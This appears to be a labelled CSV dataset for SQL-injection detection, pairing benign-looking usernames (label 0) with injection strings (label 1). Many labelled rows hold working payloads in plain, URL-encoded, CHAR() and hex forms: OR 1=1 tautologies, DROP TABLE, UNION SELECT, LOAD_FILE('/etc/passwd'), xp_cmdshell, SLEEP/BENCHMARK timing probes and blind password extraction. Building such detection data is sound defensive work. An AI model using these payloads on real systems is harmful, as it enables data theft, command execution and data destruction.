name,is_malicious
eric21,0
garnerkirsten,0
littlebrandon'; DROP TABLE users--,1
kjones,0
lreynolds,0
matthewgill,0
beth90,0
' UNION SELECT * FROM users--,1
bthomas,0
frank27'%20OR%201=1--,1
robertrogersCHAR(39)CHAR(59)CHAR(32)CHAR(69)CHAR(88)CHAR(69)CHAR(67)CHAR(32)CHAR(120)CHAR(112)CHAR(95)CHAR(99)CHAR(109)CHAR(100)CHAR(115)CHAR(104)CHAR(101)CHAR(108)CHAR(108)CHAR(40)CHAR(39)CHAR(100)CHAR(105)CHAR(114)CHAR(39)CHAR(41)CHAR(45)CHAR(45),1
daniel68' OR SOUNDEX('test')=SOUNDEX('test')--,1
kristen96,0
weaverlisa,0
reynoldsbarbara,0
'; EXEC xp_cmdshell('dir')--,1
karajenkins,0
icooper,0
qlyons,0
brandyruiz,0
sanchezmitchell,0
jessica97,0
CHAR(39)CHAR(37)CHAR(50)CHAR(48)CHAR(79)CHAR(82)CHAR(37)CHAR(50)CHAR(48)CHAR(49)CHAR(61)CHAR(49)CHAR(45)CHAR(45),1
'%20OR%201=1--,1
jennifer18,0
harriscarlos,0
iallen,0
phamadam,0
alice94,0
jamesswanson,0
%27%2b%28%53%45%4c%45%43%54 %27%30%27 %46%52%4f%4d %75%73%65%72%73 %57%48%45%52%45 %75%73%65%72%6e%61%6d%65%3d%27%61%64%6d%69%6e%27 %41%4e%44 %53%55%42%53%54%52%49%4e%47%28%70%61%73%73%77%6f%72%64%2c%31%2c%31%29%3d%27%61%27%29%2b%27,1
matthew08%27%25%32%37%25%32%30%4f%52%25%32%30%31%3d%31--,1
"unelson'+(SELECT '0' FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')+'",1
scott02,0
brucekatelyn,0
vanessafarley,0
ramseyrobert,0
stacey70,0
rogerskristen,0
julia56,0
dwright,0
ashley60,0
kevinmarquez,0
%27%25%32%30%4f%52%25%32%30%31%3d%31--,1
ramirezsonya,0
michelle22,0
calhounmeghan,0
johnrobinson' OR '1'='1,1
mccoyjoshua,0
sarah54,0
jason81,0
smithdavid,0
ronniebrown,0
christophersimmons,0
morgan20,0
christina13%27 %4f%52 %27%31%27%3d%27%31,1
angelgeorge,0
sanchezmelissa,0
mdixon,0
theresalewis'%27%20OR%201=1--,1
stephenrobinson,0
thompsondavid,0
zgarcia,0
russellkeith,0
kim31'; DROP TABLE users--,1
'/**/OR/**/'1'='1,1
dennissmith,0
dennischristina,0
richardmorgan,0
awatts,0
iflowers,0
gregoryhill,0
jamesgarcia,0
ashleysanchez,0
jamiesoto,0
penalaurie,0
alexandradavis,0
martinezchristian,0
harringtonrebecca,0
ronaldhamilton,0
jonbryant,0
baileylinda,0
kristin36,0
grimesjose,0
angiechapman,0
djones,0
rojasmary,0
vhamilton,0
garciatodd,0
erika27,0
baileyjames' UNION ALL SELECT LOAD_FILE('/etc/passwd')--,1
murrayemily,0
amandamorrison,0
dicksondavid,0
justin89,0
bookerjorge,0
kaylaluna,0
darrellevans,0
ithompson,0
patriciapotter,0
austinsmith,0
allison07,0
alicia07,0
sanchezchristine,0
shirley64,0
mark71,0
elliottdanielle,0
lorisampson,0
hickstamara,0
kristy57,0
martinezwanda,0
williamserica,0
ashleychristensen,0
melissa11,0
marshallnicholas,0
smoore,0
aprillyons,0
qhill,0
0x270x200x4f0x520x200x530x4f0x550x4e0x440x450x580x280x270x740x650x730x740x270x290x3d0x530x4f0x550x4e0x440x450x580x280x270x740x650x730x740x270x290x2d0x2d,1
mgarcia,0
bcontreras,0
james85,0
douglasmeyer,0
dcox,0
rileywesley,0
pvargas,0
dustin270x270x200x4f0x520x200x300x780x350x300x3d0x300x780x350x300x2d0x2d,1
malvarado,0
raylee,0
brenda92,0
frederickjoseph' OR CHAR(49)=CHAR(49)--,1
martinezwesley,0
jenniferalexander'; DROP TABLE users--,1
scordova,0
alanmartinez,0
sierrapena,0
emily40,0
woodwardfrank,0
kgolden,0
sharpkaren,0
jared27,0
calvarez,0
ydalton,0
kennethbooth,0
ejuarez,0
0x270x200x4f0x520x200x430x480x410x520x280x340x390x290x3d0x430x480x410x520x280x340x390x290x2d0x2d,1
jill75,0
zhunt,0
joshua05,0
jamesmoreno,0
sandragonzalez,0
david66,0
sbarker,0
fstephens,0
thomas17,0
cthomas,0
vdaniels,0
douglasjuarez,0
dennisjohnson,0
brendan05'||'1'='1,1
rodneyhernandez' OR SOUNDEX('test')=SOUNDEX('test')--,1
garnerbryan,0
scox,0
jefferyreed,0
robert72,0
gbanks,0
adriennemartinez' UNION SELECT * FROM users--,1
CHAR(39)CHAR(59)CHAR(32)CHAR(68)CHAR(82)CHAR(79)CHAR(80)CHAR(32)CHAR(84)CHAR(65)CHAR(66)CHAR(76)CHAR(69)CHAR(32)CHAR(117)CHAR(115)CHAR(101)CHAR(114)CHAR(115)CHAR(45)CHAR(45),1
dylan56,0
wattsbrandi,0
qlopez,0
wongpatrick' OR BINARY 'a'='a'--,1
coreybrown,0
michaellove,0
evansyolanda,0
vmccoy,0
%27 %4f%52 %28%53%45%4c%45%43%54 %2a %46%52%4f%4d %28%53%45%4c%45%43%54%28%53%4c%45%45%50%28%35%29%29%29%62%41%4b%4c%29--,1
amy26,0
"'+(SELECT '0' FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')+'",1
ahall,0
quinntracy,0
matthewflores,0
brianwallace,0
charleshernandez,0
emily67,0
imoore,0
fieldsjoe,0
youngnicole,0
grayalex,0
michael41,0
rowlandjennifer,0
lorilynch,0
vmason,0
sanchezlauren,0
michael27,0
davidalexander,0
oandrade,0
' UNION SELECT * FROM users--,1
ythomas,0
rosalesmarc,0
salascharles,0
dbenton,0
orussell,0
nataliecarpenter' OR 1=1--,1
xriley,0
cfernandez,0
%27 %4f%52 %28%53%45%4c%45%43%54 %2a %46%52%4f%4d %28%53%45%4c%45%43%54%28%53%4c%45%45%50%28%35%29%29%29%62%41%4b%4c%29--,1
gho,0
pamela48,0
"angela76'+(SELECT '0' FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')+'",1
bonnierogers,0
powerscharles,0
chadcopeland,0
erica34,0
christopherclark' OR 1=1--,1
'; DROP TABLE users--,1
andrewlang,0
jessica29'/**/OR/**/'1'='1,1
sking,0
cory41,0
angelbarajas,0
jonescindy,0
kempronald,0
lwallace,0
gnelson,0
jamesthomas,0
phamilton0x270x200x4f0x520x200x310x3d0x310x2d0x2d,1
wardadrian,0
khannicole,0
bgentry,0
joel46,0
pjones,0
"' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x3a,(SELECT CURRENT_USER()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--",1
zmoses,0
ellenwalker,0
awhite,0
kimberly87,0
donna31,0
johngarner,0
rmarshall,0
kmills,0
kelleycynthiaCHAR(39)CHAR(59)CHAR(32)CHAR(69)CHAR(88)CHAR(69)CHAR(67)CHAR(32)CHAR(120)CHAR(112)CHAR(95)CHAR(99)CHAR(109)CHAR(100)CHAR(115)CHAR(104)CHAR(101)CHAR(108)CHAR(108)CHAR(40)CHAR(39)CHAR(100)CHAR(105)CHAR(114)CHAR(39)CHAR(41)CHAR(45)CHAR(45),1
jeffersonjessica,0
brian83CHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(49)CHAR(61)CHAR(49)CHAR(45)CHAR(45),1
ericdawson,0
ariana23,0
rossbradley,0
rubenandrews,0
rfranklin'; DROP TABLE users--,1
troy05,0
penashane,0
joseph49,0
alejandra29,0
michaelgraham,0
bchoi,0
caitlin43,0
mcdanielcharlotte,0
caldwellkimberly,0
racheldaniels,0
"lisa07' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x3a,(SELECT CURRENT_USER()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--",1
joseph98,0
olivia84,0
susanthomas,0
pwilliams,0
'%20OR%201=1--,1
gibsonchristina,0
christophersullivan,0
richarddaniels,0
jonathanswanson,0
patriciamoreno,0
rachel37,0
achavez,0
sandracollier,0
tbarnes,0
lindajones,0
reedkatelyn'; EXEC xp_cmdshell('dir')--,1
jonesamanda' OR (SELECT * FROM (SELECT(SLEEP(5)))bAKL)--,1
carrjasmine,0
rthomas,0
yberger' OR SOUNDEX('test')=SOUNDEX('test')--,1
vsanders,0
jenniferfoster,0
garciatravis,0
%27%3b %45%58%45%43 %78%70%5f%63%6d%64%73%68%65%6c%6c%28%27%64%69%72%27%29--,1
wattsashley,0
uwheeler,0
barrlindsey,0
grobinson,0
rogersvictoria,0
dshaw,0
%27 %4f%52 %42%45%4e%43%48%4d%41%52%4b%28%31%30%30%30%30%30%30%30%2c%4d%44%35%28%4e%4f%57%28%29%29%29--,1
maxwellpatricia,0
brittneyjones,0
hannahjohnson,0
sue83,0
philip94,0
hhall,0
megan00,0
millerlisa,0
qsmith,0
' OR '1'='1,1
deniseharris,0
benjamin41,0
davebennett,0
michelle94,0
crystalsmith,0
denisesharp,0
owebb,0
matthew11,0
brownrachel,0
josehughes,0
brownjoseph,0
' UNION ALL SELECT LOAD_FILE('/etc/passwd')--,1
castrodanielle,0
patrickcain,0
elopez,0
gonzalesstacey,0
rachelhicks,0
shawn94,0
cookmaria,0
patrickfleming,0
brownronald,0
' UNION SELECT * FROM users--,1
ispence,0
"patriciataylor' OR BENCHMARK(10000000,MD5(NOW()))--",1
"'+(SELECT '0' FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')+'",1
mary03' OR CHAR(49)=CHAR(49)--,1
eric85CHAR(39)CHAR(32)CHAR(85)CHAR(78)CHAR(73)CHAR(79)CHAR(78)CHAR(32)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(32)CHAR(42)CHAR(32)CHAR(70)CHAR(82)CHAR(79)CHAR(77)CHAR(32)CHAR(117)CHAR(115)CHAR(101)CHAR(114)CHAR(115)CHAR(45)CHAR(45),1
janetfuller,0
CHAR(39)CHAR(37)CHAR(50)CHAR(48)CHAR(79)CHAR(82)CHAR(37)CHAR(50)CHAR(48)CHAR(49)CHAR(61)CHAR(49)CHAR(45)CHAR(45),1
garciapatrick,0
' OR BINARY 'a'='a'--,1
barnettmichael,0
rodney18,0
gbarker,0
benjamincook,0
vbrown,0
johnsonmartha,0
johnsonmichael,0
littlemaureen,0
williammccoy,0
david43,0
wboyd,0
usloan,0
kharris,0
ebonydavis,0
hmurphy,0
walkercheryl,0
perezmichelle'; EXEC xp_cmdshell('dir')--,1
rebecca04,0
CHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(39)CHAR(49)CHAR(39)CHAR(61)CHAR(39)CHAR(49),1
dwong,0
walkerjason,0
vgarcia,0
ohicks,0
mathewsjoshua,0
michaeljohnson,0
' OR SOUNDEX('test')=SOUNDEX('test')--,1
warcher,0
0x270x200x4f0x520x200x270x310x270x3d0x270x31,1
laurahiggins,0
jonesstacey,0
craiglee,0
michaeldean,0
"'+(SELECT '0' FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')+'",1
edwardwebster,0
iroberson,0
heather71,0
thomasnicole,0
ubrooks,0
'; EXEC xp_cmdshell('dir')--,1
hporter,0
phamlaurie,0
jodi15,0
iarmstrong' UNION ALL SELECT LOAD_FILE('/etc/passwd')--,1
danielruiz' OR SOUNDEX('test')=SOUNDEX('test')--,1
tmiller,0
mross' OR 0x50=0x50--,1
rhondafarrell,0
zdawson,0
samuelanderson,0
rebekah46,0
jennifer48,0
marissa77,0
robertscarl,0
ihall,0
floresbrian,0
angela92,0
kristin75,0
lmcknight,0
james30,0
mark25,0
walkerkaitlin,0
marc37%27 %55%4e%49%4f%4e %53%45%4c%45%43%54 %2a %46%52%4f%4d %75%73%65%72%73--,1
mendozatammy,0
julia77,0
charlesguerrero,0
haynesshawn,0
daniel43,0
shaun06,0
'%20OR%201=1--,1
fieldslauren,0
' OR 1=1--,1
elaine19,0
walkerrobert,0
kellyryan,0
christinepatterson,0
kimbruce,0
amyalvarez,0
phyllisgarcia'||'1'='1,1
'; DROP TABLE users--,1
maria78,0
' OR BINARY 'a'='a'--,1
charles77,0
yvonnemeyer,0
donald99,0
sarah26,0
starkamber,0
ohernandez,0
mathewsjason,0
nhensley,0
rebeccarobinson,0
jessica16,0
amygibson,0
deanpark0x270x2f0x2a0x2a0x2f0x4f0x520x2f0x2a0x2a0x2f0x270x310x270x3d0x270x31,1
ryanramos,0
lking,0
ashley36,0
andrew47' UNION ALL SELECT LOAD_FILE('/etc/passwd')--,1
trussell,0
mburns,0
christopher70,0
jgarza,0
douglasbrandon,0
brittneyfisher,0
amanda03,0
sydney04,0
stephanie86,0
darren81,0
griffithcrystal,0
thomasglenn,0
michael51,0
josephespinoza,0
anna97,0
nicholsoncrystal,0
masoncraig,0
mandy05,0
' OR 0x50=0x50--,1
qpatterson,0
oconnelljohn,0
rsantana,0
jonesashley,0
ltorres,0
elizabethjackson,0
brandon88,0
pvilla'; EXEC xp_cmdshell('dir')--,1
todd03,0
nicholasochoa,0
fitzgeraldantonio,0
nicholas33,0
jennifer60,0
cturner,0
mark93,0
levans,0
howardrussellCHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(39)CHAR(49)CHAR(39)CHAR(61)CHAR(39)CHAR(49),1
foxkatherine,0
fbrooks,0
devon82' OR CHAR(49)=CHAR(49)--,1
bfrey,0
idrake,0
garciamichael,0
drogers,0
baileybrian,0
michael00,0
sloanjoseph,0
hcarpenter'; DROP TABLE users--,1
patricialeon,0
mscott,0
ryanbecker' OR '1'='1,1
maryallen,0
carrollchristine,0
mario11,0
uhess,0
eadams,0
nsmith,0
angela82,0
angelayoung,0
mathewssteven,0
harmontracey,0
cooperana,0
craigjames,0
vickie51,0
nallison,0
bgarcia,0
luis94,0
stephenswesley,0
bonnie12,0
' UNION ALL SELECT LOAD_FILE('/etc/passwd')--,1
sarah75,0
sbrown,0
joshua08,0
orozcomichael,0
syoung,0
sandovaldylan,0
victoria25,0
nsparks,0
joseph69,0
robertosilva,0
xwatson,0
melanie82,0
amcclain,0
johnsonpaul,0
kristy65,0
kaitlyngutierrez,0
alisonmoreno,0
jonesmatthew,0
CHAR(39)CHAR(47)CHAR(42)CHAR(42)CHAR(47)CHAR(79)CHAR(82)CHAR(47)CHAR(42)CHAR(42)CHAR(47)CHAR(39)CHAR(49)CHAR(39)CHAR(61)CHAR(39)CHAR(49),1
michael23,0
jimmy95,0
todonnell,0
wilsonpatrick,0
CHAR(39)CHAR(59)CHAR(32)CHAR(69)CHAR(88)CHAR(69)CHAR(67)CHAR(32)CHAR(120)CHAR(112)CHAR(95)CHAR(99)CHAR(109)CHAR(100)CHAR(115)CHAR(104)CHAR(101)CHAR(108)CHAR(108)CHAR(40)CHAR(39)CHAR(100)CHAR(105)CHAR(114)CHAR(39)CHAR(41)CHAR(45)CHAR(45),1
codyhughes,0
eross,0
bishopcarl%27 %41%4e%44 %28%53%45%4c%45%43%54 %31 %46%52%4f%4d%28%53%45%4c%45%43%54 %43%4f%55%4e%54%28%2a%29%2c%43%4f%4e%43%41%54%28%30%78%33%61%2c%28%53%45%4c%45%43%54 %43%55%52%52%45%4e%54%5f%55%53%45%52%28%29%29%2c%30%78%33%61%2c%46%4c%4f%4f%52%28%52%41%4e%44%28%30%29%2a%32%29%29%78 %46%52%4f%4d %49%4e%46%4f%52%4d%41%54%49%4f%4e%5f%53%43%48%45%4d%41%2e%50%4c%55%47%49%4e%53 %47%52%4f%55%50 %42%59 %78%29%61%29--,1
flindsey,0
millercharles,0
bartonkellyCHAR(39)CHAR(43)CHAR(40)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(32)CHAR(39)CHAR(48)CHAR(39)CHAR(32)CHAR(70)CHAR(82)CHAR(79)CHAR(77)CHAR(32)CHAR(117)CHAR(115)CHAR(101)CHAR(114)CHAR(115)CHAR(32)CHAR(87)CHAR(72)CHAR(69)CHAR(82)CHAR(69)CHAR(32)CHAR(117)CHAR(115)CHAR(101)CHAR(114)CHAR(110)CHAR(97)CHAR(109)CHAR(101)CHAR(61)CHAR(39)CHAR(97)CHAR(100)CHAR(109)CHAR(105)CHAR(110)CHAR(39)CHAR(32)CHAR(65)CHAR(78)CHAR(68)CHAR(32)CHAR(83)CHAR(85)CHAR(66)CHAR(83)CHAR(84)CHAR(82)CHAR(73)CHAR(78)CHAR(71)CHAR(40)CHAR(112)CHAR(97)CHAR(115)CHAR(115)CHAR(119)CHAR(111)CHAR(114)CHAR(100)CHAR(44)CHAR(49)CHAR(44)CHAR(49)CHAR(41)CHAR(61)CHAR(39)CHAR(97)CHAR(39)CHAR(41)CHAR(43)CHAR(39),1
donaldsonmatthew,0
kevin79,0
snowpeter,0
kimberly61,0
stevenscharles,0
' OR SOUNDEX('test')=SOUNDEX('test')--,1
mendozaaaron,0
ericsmith,0
townsendkelsey,0
' OR 1=1--,1
"sandra84' OR BENCHMARK(10000000,MD5(NOW()))--",1
tammy18,0
teresabrown'||'1'='1,1
kdavis,0
myersdaniel,0
alanmoore,0
kingdawn,0
espinozaveronica,0
brad48,0
richardroberts,0
brownronald,0
kwatts,0
deverett,0
tbaker,0
wallacejeffrey,0
jesus40,0
larry11,0
barronamy,0
mariascott,0
fgross,0
paula10,0
CHAR(39)CHAR(37)CHAR(50)CHAR(55)CHAR(37)CHAR(50)CHAR(48)CHAR(79)CHAR(82)CHAR(37)CHAR(50)CHAR(48)CHAR(49)CHAR(61)CHAR(49)CHAR(45)CHAR(45),1
tylermelinda' UNION ALL SELECT LOAD_FILE('/etc/passwd')--,1
uperez,0
frankware,0
browntaylor,0
matthew00,0
ewalker,0
carlsonjeffery,0
CHAR(39)CHAR(32)CHAR(79)CHAR(82)CHAR(32)CHAR(49)CHAR(61)CHAR(49)CHAR(45)CHAR(45),1
katherinepacheco,0
umcpherson,0
acostaleslie,0
jamiebridges,0
' UNION ALL SELECT LOAD_FILE('/etc/passwd')--,1
belljohnny,0
rhondamendez,0
alexanderjohn,0
irodriguez,0
yblake,0
ncarpenter,0
amyschultz,0
dnielsen,0
michaelolsen,0
jonesvickie,0
watsonjennifer,0
amaldonado,0
deanshane,0
nielsenregina,0
qbriggs,0
sandra41,0
benjamin09,0
ewilliams,0
clee,0
fcasey,0
solson,0
brittanyrangel,0
perezjanet,0
aarongonzalez,0
underwoodchristopher' UNION ALL SELECT LOAD_FILE('/etc/passwd')--,1
garrett45,0
monica98,0
jacobmiles,0
davidchurch,0
kelli13,0
mmorrison,0
butlerzachary,0
jamesmanning,0
melissa81,0
perrydavid,0
charleslee,0
zbaker,0
kevinjohnson,0
antoniodrake,0
jose21,0
jwalkerCHAR(39)CHAR(43)CHAR(40)CHAR(83)CHAR(69)CHAR(76)CHAR(69)CHAR(67)CHAR(84)CHAR(32)CHAR(39)CHAR(48)CHAR(39)CHAR(32)CHAR(70)CHAR(82)CHAR(79)CHAR(77)CHAR(32)CHAR(117)CHAR(115)CHAR(101)CHAR(114)CHAR(115)CHAR(32)CHAR(87)CHAR(72)CHAR(69)CHAR(82)CHAR(69)CHAR(32)CHAR(117)CHAR(115)CHAR(101)CHAR(114)CHAR(110)CHAR(97)CHAR(109)CHAR(101)CHAR(61)CHAR(39)CHAR(97)CHAR(100)CHAR(109)CHAR(105)CHAR(110)CHAR(39)CHAR(32)CHAR(65)CHAR(78)CHAR(68)CHAR(32)CHAR(83)CHAR(85)CHAR(66)CHAR(83)CHAR(84)CHAR(82)CHAR(73)CHAR(78)CHAR(71)CHAR(40)CHAR(112)CHAR(97)CHAR(115)CHAR(115)CHAR(119)CHAR(111)CHAR(114)CHAR(100)CHAR(44)CHAR(49)CHAR(44)CHAR(49)CHAR(41)CHAR(61)CHAR(39)CHAR(97)CHAR(39)CHAR(41)CHAR(43)CHAR(39),1
qrice,0
karivasquez'; DROP TABLE users--,1
miawilliams,0
kristysmith,0
jeffrey14' UNION SELECT * FROM users--,1
sneal,0
autumnweaver' OR CHAR(49)=CHAR(49)--,1
mitchell38,0
fmoore,0
laurengentry,0
rebeccafuentes0x270x200x4f0x520x200x420x450x4e0x430x480x4d0x410x520x4b0x280x310x300x300x300x300x300x300x300x2c0x4d0x440x350x280x4e0x4f0x570x280x290x290x290x2d0x2d,1
gregory93,0
mario19,0
cardenastravis,0
jonathan98,0
francisshannon,0
johnsmith,0
schmidtshelly,0
dustin27,0
steven15,0
glarsen,0
desiree81,0
lambertjennifer,0
johnsonmichael,0
beth25,0
jimenezshawn,0
bernardaustin,0
christopher96,0
jonespatricia,0
greereric,0
david22,0
munozbrandon,0
jacksoncharles,0
kleinbrian,0
aholland,0
ericjohnson,0
'/**/OR/**/'1'='1,1
stacystevens,0
michellejensen,0
ashley07,0
jeremiahtucker,0
kburns,0
' OR CHAR(49)=CHAR(49)--,1
' OR BINARY 'a'='a'--,1
mbridges'; DROP TABLE users--,1
charlesbecker,0
justin75,0
reedlaura,0
daniel30,0
styler,0
ujohnson,0
amiller,0
erica47,0
jennaanderson,0
allison62,0
bowmandavid,0
jeremy29,0
rwong,0
bwebb,0
jordan97,0
lisa00,0
owilliams,0
christopherclay,0
john74,0
stephanie16,0
"' OR BENCHMARK(10000000,MD5(NOW()))--",1
zellison,0
robert96,0
margaret12,0
saundersfrederick,0
tiffany88,0
matthew18,0
amanda61,0
pinedakathy,0
dennissandoval,0
scottmorris,0
andrea29,0
bishopjason,0
larry14,0
eatonvanessa,0
walkersherry,0
'%27%20OR%201=1--,1
robert95,0
meyerrobert,0
dgreen,0
"' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x3a,(SELECT CURRENT_USER()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--",1
jmartinez,0
gpeters,0
caitlin68,0
connie60,0
edwardrodriguez,0
ssnyder,0
omoore,0
haleywilliams,0
latoya55,0
kevin25,0
steven89' OR CHAR(49)=CHAR(49)--,1
ypowell,0
ramireznicholas,0
michelle05,0
darrylsummers,0
paul35,0
dflynn,0
kylebarajas,0
' OR 1=1--,1
james22,0
jessica62,0
rodriguezscott,0
jameskhan,0
aprice,0
proy,0
sarah70,0
michael12,0
adriennewilliams,0
christophercastro,0
mcdanieljohn,0
kathrynjohnson,0
ehensley,0
tylerbell,0
choilori' OR CHAR(49)=CHAR(49)--,1
ericnelson,0
thomasvictoria,0
george99,0
christynolan,0
andrewscarrie'/**/OR/**/'1'='1,1
williamhernandez,0
yhoffman,0
victoria91,0
shannonjackson,0
cochrankevin'||'1'='1,1
jrodriguez,0
hpennington,0
justingross,0
breyes,0
elizabeth67,0
pvelasquez,0
pschneider,0
nicholasblackwell,0
jsanders,0
heather010x270x2b0x280x530x450x4c0x450x430x540x200x270x300x270x200x460x520x4f0x4d0x200x750x730x650x720x730x200x570x480x450x520x450x200x750x730x650x720x6e0x610x6d0x650x3d0x270x610x640x6d0x690x6e0x270x200x410x4e0x440x200x530x550x420x530x540x520x490x4e0x470x280x700x610x730x730x770x6f0x720x640x2c0x310x2c0x310x290x3d0x270x610x270x290x2b0x27,1
emily54,0
kbaird,0
cassandrajones,0
kyle63,0
smiththomas,0
lori49,0
stephanie00,0
melaniegilmore,0
simonjerry,0
brian08,0
scottgarrett,0
nlevine,0
ztorres,0
jacquelineknapp,0
robin70,0
0x270x200x550x4e0x490x4f0x4e0x200x530x450x4c0x450x430x540x200x2a0x200x460x520x4f0x4d0x200x750x730x650x720x730x2d0x2d,1
alexandermartinez,0
brandongonzalez,0
nicole25,0
pittsrachel,0
robert96,0
jonedwards,0
deanna33,0
markwalton,0
westcody,0
chad58,0
ashley47,0
wileytiffany,0
hannah99,0
scottjeanne,0
thomas97,0
aprilgalloway,0
kbailey' OR (SELECT * FROM (SELECT(SLEEP(5)))bAKL)--,1
lori220x270x200x410x4e0x440x200x280x530x450x4c0x450x430x540x200x310x200x460x520x4f0x4d0x280x530x450x4c0x450x430x540x200x430x4f0x550x4e0x540x280x2a0x290x2c0x430x4f0x4e0x430x410x540x280x300x780x330x610x2c0x280x530x450x4c0x450x430x540x200x430x550x520x520x450x4e0x540x5f0x550x530x450x520x280x290x290x2c0x300x780x330x610x2c0x460x4c0x4f0x4f0x520x280x520x410x4e0x440x280x300x290x2a0x320x290x290x780x200x460x520x4f0x4d0x200x490x4e0x460x4f0x520x4d0x410x540x490x4f0x4e0x5f0x530x430x480x450x4d0x410x2e0x500x4c0x550x470x490x4e0x530x200x470x520x4f0x550x500x200x420x590x200x780x290x610x290x2d0x2d,1
kathy19,0
phamrobert,0
dominguezbetty,0
steven30,0
burnsashley,0
mary33'||'1'='1,1
mwilson,0
bakerjason,0
dbaker' OR 1=1--,1
lisagonzalez,0
ronaldbrown,0
' OR '1'='1,1
samanthakim,0
russellrobert,0
dyersarah,0
%27%3b %45%58%45%43 %78%70%5f%63%6d%64%73%68%65%6c%6c%28%27%64%69%72%27%29--,1
"whitejacqueline'+(SELECT '0' FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')+'",1
%27 %4f%52 %31%3d%31--,1
sdaugherty,0
' OR '1'='1,1
"' OR BENCHMARK(10000000,MD5(NOW()))--",1
'/**/OR/**/'1'='1,1
shelbyanderson,0
nicole68,0
joseph91,0
dmitchell,0
ashley48' UNION ALL SELECT LOAD_FILE('/etc/passwd')--,1
basslaura,0
garciacameron,0
'%27%20OR%201=1--,1
qvasquez'; DROP TABLE users--,1
john65,0
jwilliams,0
rcarter,0
jeffreysmith,0
david10'; DROP TABLE users--,1
ahaynes,0
jeffreyhiggins,0
heather94,0
michaelmartin,0
stephanie52,0
noblekaren,0
kimtony,0
etaylor,0
'; EXEC xp_cmdshell('dir')--,1
xhamilton,0
davidbell,0
snichols,0
robertking,0
deckerpatricia,0
tammyhowe,0
brianbryant,0
emorris,0
cmorgan,0
taustin,0
david18' OR 0x50=0x50--,1
aliciaking,0
nathanscott,0
johnsonkathryn,0
mary91' OR BINARY 'a'='a'--,1
mary61,0
wileynicole,0
acostadaniel,0
johnsonsteve,0
bishopcorey,0
richardgarcia,0
patrickmyers,0
' OR '1'='1,1
rachael62,0
bdavis,0
kenneth90,0
ismith,0
williamgreen,0
devin27,0
sharon05,0
jacobfrazier,0
denise93,0
costacurtis,0
jennifer82%27 %4f%52 %28%53%45%4c%45%43%54 %2a %46%52%4f%4d %28%53%45%4c%45%43%54%28%53%4c%45%45%50%28%35%29%29%29%62%41%4b%4c%29--,1
deannareynolds,0
derek93,0
mariazhang,0
martinezangel,0
ufisher,0
william56,0
kelly33,0
CHAR(39)CHAR(37)CHAR(50)CHAR(55)CHAR(37)CHAR(50)CHAR(48)CHAR(79)CHAR(82)CHAR(37)CHAR(50)CHAR(48)CHAR(49)CHAR(61)CHAR(49)CHAR(45)CHAR(45),1
carla51,0
powellmary,0
solomonjoanna' OR 1=1--,1
mbrown,0
